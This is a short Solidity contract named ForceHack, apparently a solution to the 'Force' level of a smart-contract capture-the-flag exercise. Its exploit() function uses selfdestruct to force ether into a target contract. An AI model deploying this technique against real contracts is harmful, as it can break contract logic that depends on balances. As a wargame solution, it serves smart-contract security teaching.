// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract ForceHack {
     address payable public instanceAddress;

     constructor(address _instanceAddress) public {
          instanceAddress = payable(_instanceAddress);
     }

     receive() external payable {}

     function getBalance() public view returns (uint256) {
          return address(this).balance;
     }

     function exploit() public {
          selfdestruct(instanceAddress);     
     }
}